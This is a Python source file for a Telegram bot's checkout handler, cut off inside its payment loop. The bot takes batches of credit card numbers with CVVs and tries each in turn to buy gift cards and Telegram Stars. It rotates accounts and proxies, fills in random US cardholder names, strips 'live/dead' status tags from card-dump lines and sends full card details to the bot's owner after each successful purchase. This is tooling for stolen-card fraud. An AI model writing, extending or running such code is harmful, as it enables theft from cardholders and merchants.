"""
Order Handler — Complete checkout flow
- Rate limiting: 10 CC per 2h (5 per account slot)
- Account rotation: slot1 first, then slot2
- Owner gets CC details ONLY on SUCCESS
- Beautiful result captions/messages
"""
import re
import io
import time
import asyncio
import logging

from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, FSInputFile
from aiogram.fsm.context import FSMContext

from database import db
from services.u47_api import U7BuyApiClient
from services.cookie_monitor import quick_token_check
from keyboards.inline import (
    get_categories_keyboard,
    get_products_keyboard,
    get_confirmation_keyboard,
    get_use_saved_username_keyboard,
    get_owner_proxy_select
)
from states.states import OrderStates
from config import settings

logger = logging.getLogger(__name__)
router = Router()

OWNER_ID = settings.OWNER_ID

# ─────────────────────────────────────────────────────────
# Card parsers
# ─────────────────────────────────────────────────────────
import random

# Realistic USA cardholder names used when user doesn't provide one
_RANDOM_NAMES = [
    "JAMES ANDERSON", "MICHAEL JOHNSON", "ROBERT WILLIAMS", "DAVID BROWN", "WILLIAM JONES",
    "RICHARD DAVIS", "JOSEPH MILLER", "THOMAS WILSON", "CHARLES MOORE", "CHRISTOPHER TAYLOR",
    "DANIEL THOMAS", "MATTHEW JACKSON", "ANDREW WHITE", "JOSHUA HARRIS", "RYAN MARTIN",
    "JESSICA THOMPSON", "ASHLEY GARCIA", "EMILY MARTINEZ", "SARAH ROBINSON", "AMANDA CLARK",
    "STEPHANIE RODRIGUEZ", "MELISSA LEWIS", "NICOLE LEE", "ELIZABETH WALKER", "JENNIFER HALL",
    "BRITTANY ALLEN", "MEGAN YOUNG", "AMBER HERNANDEZ", "HEATHER KING", "CRYSTAL WRIGHT",
    "BRANDON SCOTT", "TYLER GREEN", "ZACHARY ADAMS", "AUSTIN BAKER", "DYLAN NELSON",
    "JACOB CARTER", "LOGAN MITCHELL", "ETHAN PEREZ", "NATHAN ROBERTS", "ALEXIS TURNER",
]

def _random_cardholder_name() -> str:
    return random.choice(_RANDOM_NAMES)

def parse_one_line_card(text: str) -> dict | None:
    parts = re.split(r'[\|\/\s\-]+', text.strip())
    parts = [p.strip() for p in parts if p.strip()]
    if len(parts) == 4:
        card_num, month, year, cvv = parts
        if not re.fullmatch(r'\d{13,19}', card_num): return None
        if not re.fullmatch(r'\d{1,2}', month): return None
        if not re.fullmatch(r'\d{2}|\d{4}', year): return None
        if not re.fullmatch(r'\d{3,4}', cvv): return None
        return {
            "card_number": card_num,
            "exp_month": month.zfill(2),
            "exp_year": year[-2:],
            "card_cvc": cvv,
            "card_holder_name": _random_cardholder_name()   # Random name if none given
        }
    return None

def parse_robust_card(line: str) -> dict | None:
    match = re.search(
        r'(\d[\s\-\d]{11,22}\d)[\|\,\;\:\/\s\t\-]+(\d{1,2})[\|\,\;\:\/\s\t\-]+(\d{2,4})[\|\,\;\:\/\s\t\-]+(\d{3,4})',
        line.strip()
    )
    if not match:
        return None
    card_raw = match.group(1)
    card_num = card_raw.replace(" ", "").replace("-", "")
    if not (13 <= len(card_num) <= 19):
        return None
    month = match.group(2)
    if not (1 <= int(month) <= 12):
        return None
    year = match.group(3)
    if len(year) == 4:
        year = year[2:]
    cvc = match.group(4)
    remaining_text = line[match.end():].strip()
    name = ""
    if remaining_text:
        parts = re.split(r'[\|\,\;\:\/\s\t\-]+', remaining_text)
        clean = []
        for np in parts:
            if not np: continue
            if np.lower() in ("active","approved","live","dead","failed","success","declined",
                               "unpaid","pending","visa","master","mastercard","amex","jcb","discover","ok"):
                break
            clean.append(np)
        if clean:
            name = " ".join(clean).upper().strip()
    if not name or len(name) < 2 or re.search(r'\d', name):
        name = _random_cardholder_name()   # Random realistic name when missing
    return {
        "card_number": card_num,
        "exp_month": month.zfill(2),
        "exp_year": year,
        "card_cvc": cvc,
        "card_holder_name": name
    }


# ─────────────────────────────────────────────────────────
# Helper: Get cookies for user's assigned slot
# ─────────────────────────────────────────────────────────
async def _get_cookies_for_slot(user: dict, slot: str) -> str | None:
    """
    Returns cookies for the given slot ("slot1" or "slot2").
    Priority: user's custom cookies > owner's account cookies for that slot.
    """
    slot_key = slot  # "slot1" or "slot2"
    slot_num = int(slot.replace("slot", ""))

    # Check user's custom cookies first
    custom_ck = user.get("custom_cookies", {}).get(slot_key)
    if custom_ck:
        return custom_ck

    # Fall back to owner's account for this proxy/slot
    proxy_id = user.get("proxy_id")
    if not proxy_id:
        return None
    accounts = await db.get_accounts_for_proxy(proxy_id)
    # accounts are ordered by slot (1, 2)
    accounts_sorted = sorted(accounts, key=lambda a: a.get("slot", 1))
    if slot_num <= len(accounts_sorted):
        return accounts_sorted[slot_num - 1].get("cookies_json")
    return None


async def _get_proxy_url_for_user(user: dict) -> str:
    proxy_id = user.get("proxy_id")
    if not proxy_id:
        return settings.PROXY_URL or ""
    proxy = await db.get_proxy(proxy_id)
    if proxy and proxy.get("active"):
        return proxy.get("url", "")
    return settings.PROXY_URL or ""


# ─────────────────────────────────────────────────────────
# Helper: Send success alert to owner (CC details)
# ─────────────────────────────────────────────────────────
async def _notify_owner_success(bot, user: dict, card: dict,
                                 product_name: str, price: str,
                                 order_id: str, target_username: str = ""):
    card_number = card.get("card_number", "")
    exp_month = card.get("exp_month", "")
    exp_year = card.get("exp_year", "")
    cvc = card.get("card_cvc", "")
    name = card.get("card_holder_name", "")

    tg_id = user.get("tg_id", "?")
    uname = f"@{user.get('username')}" if user.get("username") else f"ID:{tg_id}"
    proxy_id = user.get("proxy_id", "N/A")

    target_line = f"\n👤 *Target:* `{target_username}`" if target_username else ""

    msg = (
        f"💰 *SUCCESS ALERT*\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 *Product:* {product_name}\n"
        f"💵 *Price:* ₹{price}\n"
        f"🆔 *Order ID:* `{order_id}`{target_line}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💳 *Card Details:*\n"
        f"  Number: `{card_number}`\n"
        f"  Expiry: `{exp_month}/{exp_year}`\n"
        f"  CVV: `{cvc}`\n"
        f"  Name: `{name}`\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *User:* {uname} (`{tg_id}`)\n"
        f"🖥️ *Proxy:* `{proxy_id}`"
    )
    try:
        await bot.send_message(chat_id=OWNER_ID, text=msg, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Failed to send owner success alert: {e}")


# ─────────────────────────────────────────────────────────
# Helper: Send error alert to owner (with screenshot)
# ─────────────────────────────────────────────────────────
async def _notify_owner_error(bot, user: dict, status: str, message: str, card: dict = None, screenshot_path: str = None):
    tg_id = user.get("tg_id", "?")
    uname = f"@{user.get('username')}" if user.get("username") else f"ID:{tg_id}"
    proxy_id = user.get("proxy_id", "N/A")

    card_line = ""
    if card:
        card_num = card.get("card_number", "")
        last4 = card_num[-4:] if len(card_num) >= 4 else "????"
        card_line = f"💳 *Card:* `**** {last4}` | `{card.get('exp_month')}/{card.get('exp_year')}` | `{card.get('card_holder_name')}`\n"

    msg = (
        f"⚠️ *TRANSACTION FAILED / ALERT*\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *User:* {uname} (`{tg_id}`)\n"
        f"🖥️ *Proxy:* `{proxy_id}`\n"
        f"🔴 *Status:* `{status.upper()}`\n"
        f"💬 *Reason:* {message}\n"
        f"{card_line}"
        f"━━━━━━━━━━━━━━━━━━━━\n"
    )
    try:
        import os
        if screenshot_path and os.path.exists(screenshot_path):
            from aiogram.types import FSInputFile
            photo = FSInputFile(screenshot_path)
            await bot.send_photo(chat_id=OWNER_ID, photo=photo, caption=msg, parse_mode="Markdown")
        else:
            await bot.send_message(chat_id=OWNER_ID, text=msg, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Failed to send owner error alert: {e}")



# ─────────────────────────────────────────────────────────
# Check if user is authorized (has access key + proxy)
# ─────────────────────────────────────────────────────────
async def _check_user_access(tg_id: int) -> tuple[dict | None, str]:
    """Returns (user_record, error_message). error_message is empty if ok."""
    user = await db.get_user(tg_id)

    if tg_id == OWNER_ID:
        if not user:
            return None, "👑 Send /start first to activate your owner account."
        # Owner always active — override flag in case it was accidentally cleared
        user["active"] = True
        # If owner has no proxy yet, assign first available
        if not user.get("proxy_id"):
            proxy = await db.get_available_proxy()
            if proxy:
                user["proxy_id"] = proxy["id"]
        return user, ""

    if not user:
        return None, "🔒 *No Access*\n\nUse /start to enter your access key."
    if not user.get("active"):
        return None, "🚫 *Access Revoked*\n\nContact the owner."
    if not user.get("access_key") or not user.get("proxy_id"):
        return None, "🔒 *Not Activated*\n\nUse /start to enter your access key."
    return user, ""



# ─────────────────────────────────────────────────────────
# Browse Products Entry
# ─────────────────────────────────────────────────────────
@router.message(F.text == "🛍️ Browse Products")
async def browse_products_handler(message: Message, state: FSMContext):
    await state.clear()
    user, err = await _check_user_access(message.from_user.id)
    if err:
        await message.answer(err, parse_mode="Markdown")
        return
    await message.answer(
        "🏷️ *Select Category*\n\n"
        "Choose what you want to buy:",
        reply_markup=get_categories_keyboard(),
        parse_mode="Markdown"
    )


@router.callback_query(F.data == "back_to_categories")
async def back_to_categories(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text(
        "🏷️ *Select Category*",
        reply_markup=get_categories_keyboard(),
        parse_mode="Markdown"
    )
    await callback.answer()


@router.callback_query(F.data == "main_menu")
async def main_menu_callback(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text("🏠 Use the menu below.", parse_mode="Markdown")
    await callback.answer()


# ─────────────────────────────────────────────────────────
# Category Selection → Load products using slot1 cookies
# ─────────────────────────────────────────────────────────
@router.callback_query(F.data.startswith("cat_"))
async def process_category(callback: CallbackQuery, state: FSMContext):
    category = callback.data.split("_", 1)[1]
    user, err = await _check_user_access(callback.from_user.id)
    if err:
        await callback.answer(err.replace("*", ""), show_alert=True)
        return

    await callback.message.edit_text("⏳ *Fetching products...*", parse_mode="Markdown")

    # Use slot1 cookies to browse products
    cookies = await _get_cookies_for_slot(user, "slot1")
    if not cookies:
        # Try slot2
        cookies = await _get_cookies_for_slot(user, "slot2")
    if not cookies:
        await callback.message.edit_text(
            "❌ *No account configured.*\n\n"
            "Contact the owner to set up an account for your proxy.",
            reply_markup=get_categories_keyboard(),
            parse_mode="Markdown"
        )
        await callback.answer()
        return

    proxy_url = await _get_proxy_url_for_user(user)

    # Temporarily override global proxy
    import os
    old_proxy = os.environ.get("PROXY_URL", "")
    if proxy_url:
        os.environ["PROXY_URL"] = proxy_url

    client = U7BuyApiClient(cookies, proxy_url=proxy_url)


    if category == "google_play":
        products = await client.get_google_play_products()
        if proxy_url:
            os.environ["PROXY_URL"] = old_proxy
        if not products:
            await callback.message.edit_text(
                "❌ *Could not load products.*\n\n"
                "Session may have expired. Contact owner to refresh cookies.",
                reply_markup=get_categories_keyboard(),
                parse_mode="Markdown"
            )
            return
        await state.update_data(products_list=products, category="google_play")
        await callback.message.edit_text(
            "🎮 *Google Play Gift Cards (India)*\n\nSelect amount:",
            reply_markup=get_products_keyboard(products, "google_play"),
            parse_mode="Markdown"
        )

    elif category == "telegram_stars":
        products = await client.get_telegram_stars_products()
        if proxy_url:
            os.environ["PROXY_URL"] = old_proxy
        if not products:
            await callback.message.edit_text(
                "❌ *Could not load products.*\n\n"
                "Session may have expired. Contact owner to refresh cookies.",
                reply_markup=get_categories_keyboard(),
                parse_mode="Markdown"
            )
            return
        await state.update_data(products_list=products, category="telegram_stars")
        await callback.message.edit_text(
            "⭐ *Telegram Stars / Premium*\n\nSelect package:",
            reply_markup=get_products_keyboard(products, "telegram_stars"),
            parse_mode="Markdown"
        )
    else:
        if proxy_url:
            os.environ["PROXY_URL"] = old_proxy
        await callback.message.edit_text("❌ Unknown category.")

    await callback.answer()


# ─────────────────────────────────────────────────────────
# Google Play Product Selected
# ─────────────────────────────────────────────────────────
@router.callback_query(F.data.startswith("buy_gp_"))
async def process_gp_selection(callback: CallbackQuery, state: FSMContext):
    product_id = callback.data.replace("buy_gp_", "")
    state_data = await state.get_data()
    products_list = state_data.get("products_list", [])
    selected = next((p for p in products_list if str(p.get("skuId")) == product_id), None)
    if not selected:
        await callback.answer("Product not found. Refresh list.", show_alert=True)
        return

    sku_name = selected.get("skuName", "Google Play Card")
    price = selected.get("skuPrice", "N/A")
    sku_url = selected.get("skuUrl", "")
    await state.update_data(
        selected_product_id=product_id,
        selected_product_name=sku_name,
        selected_product_price=price,
        selected_sku_url=sku_url,
        purchase_type="google_play",
        target_username=None
    )
    await callback.message.edit_text(
        f"🎮 *{sku_name}*\n"
        f"💵 Price: ₹{price}\n"
        f"⚙️ Delivery: Instant Key\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💳 *Enter Card Details*\n"
        f"One card per line: `NUMBER|MM|YY|CVV|NAME`\n\n"
        f"_Example:_\n"
        f"`4111111111111111|12|28|123|JOHN DOE`\n\n"
        f"_Multiple cards (tried sequentially):_\n"
        f"`4111111111111111|12|28|123|JOHN DOE`\n"
        f"`5500005555555559|06|27|321|JANE SMITH`",
        parse_mode="Markdown"
    )
    await state.set_state(OrderStates.waiting_for_card_number)
    await callback.answer()


# ─────────────────────────────────────────────────────────
# Telegram Stars Product Selected
# ─────────────────────────────────────────────────────────
@router.callback_query(F.data.startswith("buy_ts_"))
async def process_ts_selection(callback: CallbackQuery, state: FSMContext):
    product_id = callback.data.replace("buy_ts_", "")
    state_data = await state.get_data()
    products_list = state_data.get("products_list", [])
    selected = next((p for p in products_list if str(p.get("skuId")) == product_id), None)
    if not selected:
        await callback.answer("Product not found.", show_alert=True)
        return

    sku_name = selected.get("skuName", "Stars")
    price = selected.get("skuPrice", "N/A")
    await state.update_data(
        selected_product_id=product_id,
        selected_offer_id=selected.get("offerId", product_id),
        selected_product_name=sku_name,
        selected_product_price=price,
        selected_sku_url="telegram-stars",
        purchase_type="telegram_stars"
    )

    user = await db.get_user(callback.from_user.id)
    saved_target = user.get("saved_target_username") if user else None
    keyboard = get_use_saved_username_keyboard(saved_target) if saved_target else None
    await callback.message.edit_text(
        f"⭐ *{sku_name}* — ₹{price}\n\n"
        f"👤 Enter the *Telegram username or ID* to top-up:\n"
        f"(e.g. `@username` or `123456789`)",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )
    await state.set_state(OrderStates.waiting_for_username)
    await callback.answer()


# ─────────────────────────────────────────────────────────
# Saved Username Callbacks
# ─────────────────────────────────────────────────────────
@router.callback_query(F.data.startswith("use_saved_tg_"))
async def use_saved_username(callback: CallbackQuery, state: FSMContext):
    username = callback.data.replace("use_saved_tg_", "")
    await state.update_data(target_username=username)
    state_data = await state.get_data()
    await callback.message.edit_text(
        f"✅ *Target:* `{username}`\n\n"
        f"💳 *Enter Card Details*\n"
        f"`NUMBER|MM|YY|CVV|NAME` (one per line)",
        parse_mode="Markdown"
    )
    await state.set_state(OrderStates.waiting_for_card_number)
    await callback.answer()


@router.callback_query(F.data == "cancel_saved_tg")
async def cancel_saved_username(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "👤 Enter Telegram username or ID to top-up:",
        parse_mode="Markdown"
    )
    await callback.answer()


# ─────────────────────────────────────────────────────────
# Username Input
# ─────────────────────────────────────────────────────────
@router.message(OrderStates.waiting_for_username)
async def process_stars_username(message: Message, state: FSMContext):
    username = message.text.strip()
    if not username.startswith("@") and not username.lstrip("-").isdigit():
        username = "@" + username
    await state.update_data(target_username=username)
    state_data = await state.get_data()
    sku_name = state_data.get("selected_product_name")
    price = state_data.get("selected_product_price")

    # Validate TG account
    user, err = await _check_user_access(message.from_user.id)
    if not err and user:
        checking = await message.answer("🔍 *Validating Telegram account...*", parse_mode="Markdown")
        proxy_url = await _get_proxy_url_for_user(user)
        cookies = await _get_cookies_for_slot(user, "slot1")
        if cookies:
            client = U7BuyApiClient(cookies, proxy_url=proxy_url)

            check_result = await client.check_account(username)
            try:
                await checking.delete()
            except Exception:
                pass
            if not check_result.get("valid"):
                raw_err = check_result.get("message", "Invalid account")
                safe_err = str(raw_err).replace("[","(").replace("]",")").replace("_"," ").replace("*","")
                await message.answer(
                    f"❌ *Invalid Telegram Account*\n\n"
                    f"`{username}` could not be validated.\n"
                    f"Reason: {safe_err}\n\n"
                    f"Please enter the correct username:",
                    parse_mode="Markdown"
                )
                return
            await db.save_target_username(message.from_user.id, username)

    try:
        await message.delete()
    except Exception:
        pass

    await message.answer(
        f"✅ *Target:* `{username}`\n\n"
        f"⭐ *{sku_name}* — ₹{price}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💳 *Enter Card Details*\n"
        f"One per line: `NUMBER|MM|YY|CVV|NAME`\n\n"
        f"_Example:_\n"
        f"`4111111111111111|12|28|123|JOHN DOE`",
        parse_mode="Markdown"
    )
    await state.set_state(OrderStates.waiting_for_card_number)


# ─────────────────────────────────────────────────────────
# Card Number / Multi-card batch input
# ─────────────────────────────────────────────────────────
@router.message(OrderStates.waiting_for_card_number, F.text)
async def process_card_number(message: Message, state: FSMContext):
    text = message.text.strip()
    try:
        await message.delete()
    except Exception:
        pass

    tg_id = message.from_user.id
    user, err = await _check_user_access(tg_id)
    if err:
        await message.answer(err, parse_mode="Markdown")
        await state.clear()
        return

    # ── Rate limit check ──
    allowed, cooldown_secs, slot = await db.can_check_cc(tg_id)
    if not allowed:
        hrs = cooldown_secs // 3600
        mins = (cooldown_secs % 3600) // 60
        await message.answer(
            f"⏳ *Rate Limit Reached*\n\n"
            f"You've used all 10 CC checks for this 2-hour window.\n\n"
            f"🕐 *Cooldown:* {hrs}h {mins}m remaining\n\n"
            f"_This limit protects your accounts from being blocked._",
            parse_mode="Markdown"
        )
        return

    lines = [l.strip() for l in text.splitlines() if l.strip()]

    # Try multi-line batch parse
    if len(lines) >= 1:
        parsed_cards = [parse_robust_card(l) for l in lines]
        valid_cards = [c for c in parsed_cards if c is not None]

        if valid_cards:
            # Check if batch count exceeds rate limit
            remaining_checks = 10 - (await db.get_rate_limit(tg_id)).get("total_used", 0)
            if len(valid_cards) > remaining_checks:
                valid_cards = valid_cards[:remaining_checks]

            if len(valid_cards) == 1:
                c = valid_cards[0]
                masked = f"**** **** **** {c['card_number'][-4:]}"
                await message.answer(
                    f"✅ *1 Card Ready*\n\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"💳 `{masked}`\n"
                    f"📅 `{c['exp_month']}/{c['exp_year']}`\n"
                    f"👤 `{c['card_holder_name']}`\n"
                    f"━━━━━━━━━━━━━━━━━━\n\n"
                    f"Confirm to proceed with payment:",
                    reply_markup=get_confirmation_keyboard(),
                    parse_mode="Markdown"
                )
            else:
                preview = "\n".join([
                    f"{i}. `**** {c['card_number'][-4:]}` | `{c['exp_month']}/{c['exp_year']}` | `{c['card_holder_name']}`"
                    for i, c in enumerate(valid_cards, 1)
                ])
                await message.answer(
                    f"✅ *{len(valid_cards)} Cards Ready*\n\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"{preview}\n"
                    f"━━━━━━━━━━━━━━━━━━\n\n"
                    f"Cards will be tried sequentially until one succeeds.\n"
                    f"Confirm to proceed:",
                    reply_markup=get_confirmation_keyboard(),
                    parse_mode="Markdown"
                )
            await state.update_data(cards_batch=valid_cards)
            await state.set_state(OrderStates.confirm_purchase)
            return

    # Single card number only (no CVV yet)
    card_raw = text.replace(" ", "").replace("-", "")
    if not re.fullmatch(r"\d{13,19}", card_raw):
        await message.answer(
            "❌ *Invalid Format*\n\n"
            "Use: `NUMBER|MM|YY|CVV|NAME`\n"
            "Or just send multiple cards one per line.",
            parse_mode="Markdown"
        )
        return

    await state.update_data(card_number=card_raw)
    await message.answer(
        "✅ Card number saved.\n\n"
        "📅 Enter *Expiry Date* (`MM/YY`):",
        parse_mode="Markdown"
    )
    await state.set_state(OrderStates.waiting_for_card_expiry)


# ─────────────────────────────────────────────────────────
# TXT File Upload
# ─────────────────────────────────────────────────────────
@router.message(OrderStates.waiting_for_card_number, F.document)
async def process_card_txt_upload(message: Message, state: FSMContext):
    doc = message.document
    if doc.mime_type not in ("text/plain",) and not (doc.file_name or "").lower().endswith(".txt"):
        await message.answer("❌ Only `.txt` files accepted.", parse_mode="Markdown")
        return

    tg_id = message.from_user.id
    user, err = await _check_user_access(tg_id)
    if err:
        await message.answer(err, parse_mode="Markdown")
        await state.clear()
        return

    allowed, cooldown_secs, slot = await db.can_check_cc(tg_id)
    if not allowed:
        hrs = cooldown_secs // 3600
        mins = (cooldown_secs % 3600) // 60
        await message.answer(
            f"⏳ *Rate Limit Reached*\n\n"
            f"Cooldown: {hrs}h {mins}m remaining.",
            parse_mode="Markdown"
        )
        return

    parsing_msg = await message.answer("📂 *Parsing file...*", parse_mode="Markdown")
    try:
        file_bytes = io.BytesIO()
        await message.bot.download(doc, destination=file_bytes)
        file_bytes.seek(0)
        raw_text = file_bytes.read().decode("utf-8", errors="ignore")
    except Exception as e:
        await parsing_msg.edit_text(f"❌ File error: {e}")
        return

    lines = [l.strip() for l in raw_text.splitlines() if l.strip()]
    valid_cards = [c for c in (parse_robust_card(l) for l in lines) if c is not None]
    invalid_count = len(lines) - len(valid_cards)

    if not valid_cards:
        await parsing_msg.edit_text("❌ No valid cards found in file.")
        return

    # Limit to remaining checks
    rl = await db.get_rate_limit(tg_id)
    remaining = 10 - rl.get("total_used", 0)
    if len(valid_cards) > remaining:
        valid_cards = valid_cards[:remaining]

    try:
        await message.delete()
    except Exception:
        pass

    preview = "\n".join([
        f"{i}. `**** {c['card_number'][-4:]}` | `{c['exp_month']}/{c['exp_year']}` | `{c['card_holder_name']}`"
        for i, c in enumerate(valid_cards[:5], 1)
    ])
    if len(valid_cards) > 5:
        preview += f"\n_...and {len(valid_cards)-5} more_"

    invalid_note = f"\n⚠️ {invalid_count} invalid lines skipped." if invalid_count else ""

    await parsing_msg.edit_text(
        f"✅ *{len(valid_cards)} Cards from* `{doc.file_name}`\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{preview}{invalid_note}\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"Confirm to start processing:",
        reply_markup=get_confirmation_keyboard(),
        parse_mode="Markdown"
    )
    await state.update_data(cards_batch=valid_cards)
    await state.set_state(OrderStates.confirm_purchase)


# ─────────────────────────────────────────────────────────
# Card Expiry, CVC, Name (step-by-step path)
# ─────────────────────────────────────────────────────────
@router.message(OrderStates.waiting_for_card_expiry)
async def process_card_expiry(message: Message, state: FSMContext):
    expiry = message.text.strip()
    try:
        await message.delete()
    except Exception:
        pass
    match = re.fullmatch(r"(\d{2})[/\-](\d{2,4})", expiry)
    if not match:
        await message.answer("❌ Invalid format. Use `MM/YY` (e.g. `01/27`):", parse_mode="Markdown")
        return
    exp_month = match.group(1)
    exp_year = match.group(2)[-2:]
    await state.update_data(exp_month=exp_month, exp_year=exp_year)
    await message.answer("✅ Expiry saved.\n\n🔒 Enter *CVV/CVC* (3-4 digits):", parse_mode="Markdown")
    await state.set_state(OrderStates.waiting_for_card_cvc)


@router.message(OrderStates.waiting_for_card_cvc)
async def process_card_cvc(message: Message, state: FSMContext):
    cvc = message.text.strip()
    try:
        await message.delete()
    except Exception:
        pass
    if not re.fullmatch(r"\d{3,4}", cvc):
        await message.answer("❌ Invalid CVV. Enter 3 or 4 digits:")
        return
    await state.update_data(card_cvc=cvc)
    await message.answer("✅ CVV saved.\n\n👤 Enter *Cardholder Name* (as on card):", parse_mode="Markdown")
    await state.set_state(OrderStates.waiting_for_card_name)


@router.message(OrderStates.waiting_for_card_name)
async def process_card_name(message: Message, state: FSMContext):
    name = message.text.strip().upper()
    try:
        await message.delete()
    except Exception:
        pass
    if len(name) < 2:
        await message.answer("❌ Invalid name. Enter cardholder name as on the card:")
        return
    await state.update_data(card_holder_name=name)
    state_data = await state.get_data()

    sku_name = state_data.get("selected_product_name")
    price = state_data.get("selected_product_price")
    target = state_data.get("target_username")
    card_number = state_data.get("card_number", "")
    exp_month = state_data.get("exp_month", "")
    exp_year = state_data.get("exp_year", "")
    masked = f"**** **** **** {card_number[-4:]}" if len(card_number) >= 4 else "****"
    delivery_line = f"👤 *Target:* `{target}`\n" if target else "⚙️ *Delivery:* Instant Key\n"

    await message.answer(
        f"🛒 *Order Confirmation*\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📦 *Product:* {sku_name}\n"
        f"💵 *Price:* ₹{price}\n"
        f"{delivery_line}"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"💳 *Payment Details:*\n"
        f"  Card: `{masked}`\n"
        f"  Expiry: `{exp_month}/{exp_year}`\n"
        f"  Name: `{name}`\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"⚠️ Confirm to process payment:",
        reply_markup=get_confirmation_keyboard(),
        parse_mode="Markdown"
    )
    await state.set_state(OrderStates.confirm_purchase)


# ─────────────────────────────────────────────────────────
# Execute Purchase — Main payment loop
# ─────────────────────────────────────────────────────────
@router.callback_query(F.data.startswith("confirm_buy_"))
async def execute_purchase(callback: CallbackQuery, state: FSMContext):
    decision = callback.data.replace("confirm_buy_", "")

    if decision == "no":
        await callback.message.edit_text(
            "❌ *Order Cancelled*\n\nReturn to menu to place a new order.",
            parse_mode="Markdown"
        )
        await state.clear()
        await callback.answer()
        return

    tg_id = callback.from_user.id

    # Owner gets proxy selector before proceeding
    if tg_id == OWNER_ID:
        proxies = await db.list_proxies()
        active = [p for p in proxies if p.get("active")]
        if active:
            await callback.message.edit_text(
                f"🖥️ *Select Proxy for this Transaction*\n\n"
                f"Choose which proxy to route this payment through:",
                reply_markup=get_owner_proxy_select(active),
                parse_mode="Markdown"
            )
            await callback.answer()
            return   # wait for proxy selection callback

    # Regular user — proceed directly
    await _do_execute_purchase(callback, state)


@router.callback_query(F.data.startswith("owner_use_proxy_"))
async def owner_proxy_selected(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != OWNER_ID:
        await callback.answer("Not authorized.", show_alert=True)
        return
    proxy_choice = callback.data.replace("owner_use_proxy_", "")
    if proxy_choice == "default":
        # Use owner's default proxy — don't override
        await state.update_data(owner_override_proxy_id=None)
    else:
        await state.update_data(owner_override_proxy_id=proxy_choice)
    await callback.answer()
    await _do_execute_purchase(callback, state)


async def _do_execute_purchase(callback: CallbackQuery, state: FSMContext):
    state_data = await state.get_data()
    product_name = state_data.get("selected_product_name")
    price = state_data.get("selected_product_price")
    sku_url = state_data.get("selected_sku_url", "")
    target_username = state_data.get("target_username")
    offer_id = state_data.get("selected_offer_id")
    tg_id = callback.from_user.id
    owner_override_proxy = state_data.get("owner_override_proxy_id")

    cards_batch = state_data.get("cards_batch")
    if not cards_batch:
        cards_batch = [{
            "card_number": state_data.get("card_number"),
            "exp_month": state_data.get("exp_month"),
            "exp_year": state_data.get("exp_year"),
            "card_cvc": state_data.get("card_cvc"),
            "card_holder_name": state_data.get("card_holder_name")
        }]

    user, err = await _check_user_access(tg_id)
    if err:
        await callback.message.edit_text(err, parse_mode="Markdown")
        await state.clear()
        await callback.answer()
        return

    # If owner selected a specific proxy override, apply it
    if tg_id == OWNER_ID and owner_override_proxy:
        proxy = await db.get_proxy(owner_override_proxy)
        if proxy:
            user["proxy_id"] = owner_override_proxy
            proxy_label = proxy.get("label", owner_override_proxy)
        else:
            proxy_label = "Default"
    elif tg_id == OWNER_ID:
        proxy = await db.get_proxy(user.get("proxy_id", ""))
        proxy_label = proxy.get("label", "Default") if proxy else "Default"
    else:
        proxy_label = ""


    # Rate limit check (Bypassed for OWNER)
    if tg_id != OWNER_ID:
        allowed, cooldown_secs, current_slot = await db.can_check_cc(tg_id)
        if not allowed:
            hrs = cooldown_secs // 3600
            mins = (cooldown_secs % 3600) // 60
            await callback.message.edit_text(
                f"⏳ *Rate Limit Reached*\n\n"
                f"All 10 CC checks used for this window.\n"
                f"⏰ *Cooldown:* {hrs}h {mins}m",
                parse_mode="Markdown"
            )
            await state.clear()
            await callback.answer()
            return

    await callback.message.edit_text(
        f"⏳ *Processing...*\n\n"
        f"📦 {product_name} — ₹{price}\n"
        + (f"🖥️ Proxy: `{proxy_label}`\n" if proxy_label else "")
        + f"🔄 Initializing checkout...",
        parse_mode="Markdown"
    )
    await callback.answer()

    proxy_url = await _get_proxy_url_for_user(user)
    import os
    old_proxy = os.environ.get("PROXY_URL", "")
    if proxy_url:
        os.environ["PROXY_URL"] = proxy_url

    def is_card_decline(res: dict) -> bool:
        error_msg = str(res.get("message") or res.get("error") or "").lower()
        decline_code = str(res.get("decline_code") or "").lower()
        error_code = str(res.get("error_code") or "").lower()
        
        card_decline_keywords = [
            "decline", "insufficient", "cvc", "expiry", "stolen", "lost", 
            "incorrect", "invalid_number", "invalid_expiry", "expired"
        ]
        if any(k in error_msg for k in card_decline_keywords):
            return True
        if any(k in decline_code for k in card_decline_keywords):
            return True
        if any(k in error_code for k in card_decline_keywords):
            return True
        return False

    total_cards = len(cards_batch)
    result = {"status": "failed", "message": "No cards attempted."}
    last_card = cards_batch[0]
    order_id = "N/A"
    status = "failed"

    # ── Build sorted list of all owner accounts ONCE (for circular rotation) ──
    _owner_accounts_sorted = []
    if tg_id == OWNER_ID:
        all_owner_accs = await db.list_all_accounts()
        for _acc in all_owner_accs:
            if not _acc.get("cookies_json"):
                continue
            _proxy_obj = await db.get_proxy(_acc.get("proxy_id", ""))
            if not _proxy_obj or not _proxy_obj.get("active"):
                continue
            _owner_accounts_sorted.append((_acc, _proxy_obj))
        # Sort: preferred proxy first, then by slot order
        selected_proxy_id = user.get("proxy_id", "")
        _owner_accounts_sorted.sort(key=lambda x: (
            0 if x[0].get("proxy_id") == selected_proxy_id else 1,
            x[0].get("slot", 1)
        ))

    for card_idx, card in enumerate(cards_batch, 1):
        last_card = card
        card_number = card.get("card_number")
